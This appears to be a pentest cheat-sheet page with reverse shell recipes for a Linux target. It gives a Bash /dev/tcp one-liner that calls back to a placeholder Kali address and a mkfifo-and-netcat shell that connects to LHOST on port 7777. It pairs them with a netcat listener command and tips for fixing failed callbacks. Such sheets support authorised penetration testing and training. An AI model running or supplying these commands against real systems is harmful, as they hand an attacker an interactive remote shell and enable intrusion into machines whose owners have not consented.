## Connect a Bash command session to a listener

**Run in:** Linux target shell. **Requires:** Bash with TCP redirection support and a reachable Kali nc -lvnp 4444 listener; replace the callback address with one reachable from this target.

```bash
bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
```

**What the result establishes:** Verify which shell is executing the payload and which network address is reachable from the target.

**Next check:** Check Bash availability, shell quoting, egress and listener binding independently; after connection verify id and the hostname before upgrading the terminal.

## 1. Kali — listener

**Kali**

```bash
nc -lvnp 7777
```

## 2. Linux target — connect

**Linux target**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc LHOST 7777 > /tmp/f
```

Replace LHOST; the saved recipe uses /tmp/f.

## If it fails

| Symptom | Check |
| --- | --- |
| The command exits or the listener never receives a connection | Bash-specific redirections do not work in every /bin/sh implementation; a listener on the wrong interface cannot receive the callback. |
